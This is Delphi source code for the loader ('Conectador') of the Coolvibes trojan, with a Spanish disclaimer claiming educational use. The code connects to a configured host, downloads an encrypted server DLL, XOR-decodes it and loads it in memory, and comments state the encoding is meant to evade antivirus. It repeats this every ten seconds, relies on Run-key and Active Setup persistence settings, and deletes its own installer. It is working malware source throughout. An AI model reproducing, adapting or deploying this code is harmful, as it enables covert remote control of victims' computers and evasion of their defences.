{Unit principal del Conectador del troyano Coolvibes}
(* Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)
library Conectador; //Para inyectar descomentar
//program Conectador; //para no inyectar descomentar
uses
  Windows,
  BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
  SettingsDef,
  WinSock,
  shellapi,
  UnitInstalacion,
  vars,
  Shfolder,
  Minireg;

var
  dllc                        : string;
  i                           : integer;
  MCompartida                 : THandle;
  ConfigCompartida            : PConfigCompartida;
  Indice                      : string;
  ClaveCifrado1, ClaveCifrado2: integer; //Claves para cifrar el plugin
  Loaded                      : integer;



function LastPos(Needle: char; Haystack: string): integer;
begin
  for Result := Length(Haystack) downto 1 do
    if Haystack[Result] = Needle then
      Break;
end;



function inttostr(const value: integer): string;
var
  S: string[11];
begin
  Str(Value, S);
  Result := S;
end;



function strtoint(const s: string): integer;
var
  e: integer;
begin
  val(s, result, e);
end;



function fileexists(const filename: string): boolean;
var
  filedata: twin32finddata;
  hfile   : cardinal;
begin
  hfile := findfirstfile(pchar(filename), filedata);
  if (hfile <> invalid_handle_value) then
  begin
    result := true;
    windows.findclose(hfile);
  end else
    result := false;
end;



Function GetCurrentDirectory: String; //conseguir dir actual sin sysutils
Var
  a: string;
Begin
  a := paramstr(0);
  while pos('\', a) > 0 do
  begin
    Result := result+Copy(a, 1, Pos('\', a));
    Delete(a, 1, Pos('\', a));
  end;
End;



Function TranslateMacro(Macro: String): String;
Var
  Size  : Cardinal;
  Output: Array[0..MAX_PATH] of Char;
Begin
  Result := '';
  FillChar(Output, SizeOf(Output), #0);

  Size := SizeOf(Output);
  Size := GetEnvironmentVariable(PChar(Macro), Output, Size);
  If (Size > 0) Then
    Result := Output;
End;



function cifrar(text: ansistring; i: integer): ansistring;
var
  iloop: integer;
begin
  for iloop := 1 to length(text) do
  begin
    text[iloop] := chr(ord(text[iloop]) xor i); //funcion de cifrado simple para evadir antiviruses
  end;
  result := text;
end;



function lc(const s: string): string;
  const a=1;
var
  max, charno: cardinal;
  presult    : pchar;
begin
  max := length(s);
  setlength(result, max);
  if max <= 0 then exit;
  presult := pchar(result);
  charno := 0;
  repeat
    presult[charno] := s[charno+a];
    if (s[charno+a]>= 'a') and (s[charno+a] <= 'z') then
      presult[charno] := char(ord(s[charno+a]) + 32);
    inc(charno);
  until(charno>= max);
end;



function readfile(filename: string): ansistring;
var
  f              : file;
  buffer         : ansistring;
  size           : integer;
  defaultfilemode: byte;
begin
  result := '';
  defaultfilemode := filemode;
  filemode := 0;
  assignfile(f, filename);
  reset(f, 1);

  if (ioresult = 0) then
  begin
    size := filesize(f);

    setlength(buffer, size);
    blockread(f, buffer[1], size);
    result := buffer;

    closefile(f);
  end;

  filemode := defaultfilemode;
end;



procedure loaddll(path: string); //Funcion para cargar el servidor
var
  content:       string;
  p:             pointer;
  m_DllDataSize: cardinal;
begin
  content := readfile(path);
  content := cifrar(content,ClaveCifrado2);
  content := cifrar(content,ClaveCifrado1);
  p := @content[1];
  m_DllDataSize := length(content);
  if(length(content) > 0) then
    BTMemoryLoadLibary(p, m_DllDataSize); //injectamos DLL

  Loaded := Loaded+1;
  if(Loaded>10) then
  begin
    if(fileexists(Pchar(path))) then
    deletefile(Pchar(path)); //Falla la carga de la dll mas de 10 veces... la borramos
    Loaded := 0;
  end;
end;



function GetIPFromHost(const HostName: string): string;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe:  PHostEnt;
  pptr: PaPInAddr;
  i:    Integer;
begin
  Result := '';
  phe := GetHostByName(PChar(HostName));
  if phe = nil then Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while pPtr^[i] <> nil do
  begin
    Result := inet_ntoa(pptr^[i]^);
    Inc(i);
  end;
end;


procedure iniciar();
var
  host:        String;
  port:        integer;
  wsaData:     TWSAData;
  lSocket:     TSocket;
  Addr:        TSockAddrIn;
  Enviar:      String;
  buf:         Array [0..0] of char;
  desco:       boolean;
  iRecv:       int64;
  ssize:       string;
  isize:       int64;
  plugin:      file;
  TotalRead:   integer;
  CurrRead:    integer;
  CurrWritten: integer;
  ByteArray:   array[0..1023] of char;

begin
  desco := false;
  {while fileExists(dllc) do //ya tenemos la dll
  loaddll(dllc);}
  if indice = '' then
    indice := configuracion.shosts;
  host := Copy(indice, 1, Pos(':', indice) -1 );
  Delete(indice, 1, Pos(':', indice));
  Port := strtoint(Copy(indice, 1, Pos('¬', indice) -1 ));
  Delete(indice, 1, Pos('¬', indice));

  if (WSAStartup($0202, wsaData) <> 0) then //iniciamos winsock
    Exit; //error

  lSocket := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family   := AF_INET;
  Addr.sin_port     := htons(Port);
  Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(Host)));

  if (winsock.Connect(lSocket, Addr, SizeOf(Addr)) = 0) then //intentamos conectar
  begin //conectados
    Enviar := 'GETSERVER|'+inttostr(clavecifrado1)+'|'+inttostr(clavecifrado2)+'|'+#13+#10;
    Send(lSocket, Enviar[1], length(Enviar), 0); //pedimos el tamaño del servidor
    desco := false;
    iRecv := 0;
    ZeroMemory(@buf, SizeOf(buf));
    iRecv := Recv(lSocket, buf, SizeOf(buf), 0); //Tenemos que leer el MAININFO
    while (iRecv > 0) do
    begin
      if(iRecv = INVALID_SOCKET) then
      begin
        desco := true;
        break;
      end;

      if(buf[0] = #14) then break;
      ZeroMemory(@buf, SizeOf(buf));
      iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
    end; //ya hemos recibido el MAININFO, ahora toca intentar recibir el tamaño

    if(desco) then
    begin
      CloseSocket(lSocket);
      exit; //nos hemos desconectado
    end;

    ssize := '';
    ZeroMemory(@buf, SizeOf(buf));
    iRecv := Recv(lSocket, buf, SizeOf(buf), 0); //Recibimos el tamaño
    while (iRecv > 0) do
    begin
      if(iRecv = INVALID_SOCKET) then
      begin
        desco := true;
        break;
      end;

      if(buf[0] = #14) then break;
      if(buf[0] <> #10) and (buf[0] <> #13) then
        ssize := ssize+buf[0];
      ZeroMemory(@buf, SizeOf(buf));
      iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
    end;
  end;

  if(desco) then
  begin
    CloseSocket(lSocket);
    exit; //nos hemos desconectado
  end;
  isize := strtoint(ssize); //ya tenemos el tamaño
  if(isize <> 0) then
  begin
    AssignFile(plugin, dllc);
    Rewrite(plugin, 1);
    Totalread := 0;

    while (TotalRead < isize) do
    begin
      ZeroMemory(@byteArray, SizeOf(byteArray));
      currRead := Recv(lSocket, byteArray, SizeOf(byteArray), 0); //GOGOGO
      if(currRead = INVALID_SOCKET) then
      begin
        desco := true;
        break;
      end;
      TotalRead := TotalRead + currRead;
      BlockWrite(plugin, bytearray, currRead,currwritten);
      currwritten := currRead;
    end;

    CloseFile(plugin);
  end;

  if(desco) then
  begin
    DeleteFile(Pchar(dllc));
    CloseSocket(lSocket);
    exit; //nos hemos desconectado
  end;

  {if fileExists(dllc) then
    loaddll(dllc);}
end;



procedure loadsettings();
var
  ConfigLeida:   PSettings;
  CerrarMonitor: boolean;
begin
  //Leerlo de la config?
  if ReadSettings(ConfigLeida) = True then //Como no estoy injectado puedo leer la configuracion como siempre
  begin
    Configuracion.sHosts                       := ConfigLeida^.sHosts;
    Configuracion.sID                          := ConfigLeida^.sID;
    Configuracion.bCopiarArchivo               := ConfigLeida^.bCopiarArchivo;
    Configuracion.sFileNameToCopy              := ConfigLeida^.sFileNameToCopy;
    Configuracion.sCopyTo                      := ConfigLeida^.sCopyTo;
    Configuracion.bCopiarConFechaAnterior      := ConfigLeida^.bCopiarConFechaAnterior;
    Configuracion.bMelt                        := ConfigLeida^.bMelt;
    Configuracion.bArranqueRun                 := ConfigLeida^.bArranqueRun;
    Configuracion.sRunRegKeyName               := ConfigLeida^.sRunRegKeyName;
    Configuracion.bArranqueActiveSetup         := ConfigLeida^.bArranqueActiveSetup;
    Configuracion.sActiveSetupKeyName          := ConfigLeida^.sActiveSetupKeyName;
    Configuracion.sPluginName                  := ConfigLeida^.sPluginName;
    dllc                                       := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+ConfigLeida^.sPluginName;
  end
  else
  begin
    //Estoy corriendo como injectado, así que tengo que leer la configuración escrita por Injector.exe desde memoria
    MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');

    if(MCompartida <> 0) then //Leida con Éxito :D
    begin
      ConfigCompartida := MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
      //Quizás habría que guardar esta configuración cifrada...
      Configuracion.sHosts                  := ConfigCompartida.sHosts;
      Configuracion.sID                     := ConfigCompartida.sID;
      Configuracion.bCopiarArchivo          := ConfigCompartida.bCopiarArchivo;
      Configuracion.sFileNameToCopy         := ConfigCompartida.sFileNameToCopy;
      Configuracion.sCopyTo                 := ConfigCompartida.sCopyTo;
      Configuracion.bCopiarConFechaAnterior := ConfigCompartida.bCopiarConFechaAnterior;
      Configuracion.bMelt                   := ConfigCompartida.bMelt;
      Configuracion.bArranqueRun            := ConfigCompartida.bArranqueRun;
      Configuracion.sRunRegKeyName          := ConfigCompartida.sRunRegKeyName;
      Configuracion.bArranqueActiveSetup    := ConfigCompartida.bArranqueActiveSetup;
      Configuracion.sActiveSetupKeyName     := ConfigCompartida.sActiveSetupKeyName;
      Configuracion.sPluginName             := ConfigCompartida.sPluginName;
      Configuracion.sInyectadorFile         := ConfigCompartida.sInyectadorFile;
      UnmapViewOfFile(ConfigCompartida);
      CloseHandle(MCompartida); //La escribimos
      dllc                                  := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)+Configuracion.sPluginName;
    end
    else
    begin //Para Debug
      Exitprocess(0);
      {Configuracion.sHosts                 := '127.0.0.1:80¬';
      Configuracion.sID                     := 'Coolserver';
      Configuracion.bCopiarArchivo          := false;
      Configuracion.sFileNameToCopy         := 'coolserver.exe';
      Configuracion.sCopyTo                 := '%windir%\lol\';
      Configuracion.bCopiarConFechaAnterior := False;
      Configuracion.bMelt                   := False;
      Configuracion.bArranqueRun            := true;
      Configuracion.sRunRegKeyName          := 'Coolserver';
      Configuracion.sPluginName             := 'coolserver.dll';
      Configuracion.sActiveSetupKeyName     := 'test';
      Configuracion.bArranqueActiveSetup    := true;
      dllc                                  := GetCurrentDirectory+Configuracion.sPluginName;}
    end;
  end;

  ClaveCifrado1 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)+1]);
  ClaveCifrado2 := ord(Configuracion.shosts[length(Configuracion.shosts)-(length(Configuracion.shosts) div 2)]);
  MCompartida := CreateFileMapping( $FFFFFFFF,nil,PAGE_READWRITE,0,SizeOf(TSettings),'Config');
  ConfigCompartida := MapViewOfFile(MCompartida,FILE_MAP_WRITE,0,0,0);

  //Escribimos datos en el fichero de memoria para que coolserver.dll los lea
  ConfigCompartida^.sHosts                  := Configuracion.sHosts;
  ConfigCompartida^.sID                     := Configuracion.sID;
  ConfigCompartida^.bCopiarArchivo          := Configuracion.bCopiarArchivo;
  ConfigCompartida^.sFileNameToCopy         := Configuracion.sFileNameToCopy;
  ConfigCompartida^.sCopyTo                 := Configuracion.sCopyTo;
  ConfigCompartida^.bCopiarConFechaAnterior := Configuracion.bCopiarConFechaAnterior;
  ConfigCompartida^.bMelt                   := Configuracion.bMelt;
  ConfigCompartida^.bArranqueRun            := Configuracion.bArranqueRun;
  ConfigCompartida^.sRunRegKeyName          := Configuracion.sRunRegKeyName;
  ConfigCompartida^.bArranqueActiveSetup    := Configuracion.bArranqueActiveSetup;
  ConfigCompartida^.sActiveSetupKeyName     := Configuracion.sActiveSetupKeyName;
  ConfigCompartida^.sPluginName             := Configuracion.sPluginName;
  ConfigCompartida^.bCerrar                 := true; //Mandamos cerrar a Jeringa.exe para que deje de compartir él la configuración y se cierre
  ConfigCompartida^.sInyectadorFile         := Configuracion.sInyectadorFile;

end;



procedure main;
begin

  while true do
  begin
    while fileExists(dllc) do
      loaddll(dllc);
    iniciar();
    sleep(10000); //Cada 10 segundos
  end;

  WSACleanup();

end;



begin
  if ParamStr(1) = '\melt' then //Esto pasará solamente si no tenemos la opción de inyectar
  begin
    //Borro el archivo de instalación, reintento 5 veces por si las moscas :)
    for i := 1 to 5 do
    begin
      if not FileExists(ParamStr(2)) then
        break
      else
        DeleteFile(Pchar(ParamStr(2)));
        Sleep(10);
    end;
  end; //Termina el Melt

  loadsettings(); //Leemos la configuración y la compartimos en caso de que haga falta
  Instalar();
  main();
end.
